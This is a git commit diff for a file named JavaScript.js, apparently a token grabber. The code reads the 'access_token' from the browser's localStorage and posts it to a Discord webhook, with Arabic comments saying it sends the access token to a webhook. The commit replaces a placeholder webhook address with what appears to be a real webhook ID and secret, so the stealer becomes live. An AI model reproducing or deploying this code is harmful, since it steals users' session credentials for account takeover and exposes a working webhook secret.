5a56bb77cd657b410184c9981d6ed93bd1f634b1
DXER <86264479+DXERX@users.noreply.github.com>
2023-10-10 16:12:00 +0300

    Update JavaScript.js

--- JavaScript.js
+++ JavaScript.js
@@ -2,7 +2,7 @@
 const access_token = window.localStorage.getItem("access_token");
 
 // أرسل رمز الوصول إلى ويب هوك
-const webhook_url = "https://discord.com/api/webhooks/12345678901234567890/abcdefghijklmnopqrstuvwxyz";
+const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
 const data = JSON.stringify({
   token: access_token,
 });
@@ -16,7 +16,7 @@ fetch(webhook_url, {
 const access_token = window.localStorage.getItem("access_token");
 
 // أرسل رمز الوصول إلى ويب هوك
-const webhook_url = "https://discord.com/api/webhooks/12345678901234567890/abcdefghijklmnopqrstuvwxyz";
+const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
 const data = JSON.stringify({
   token: access_token,
 });
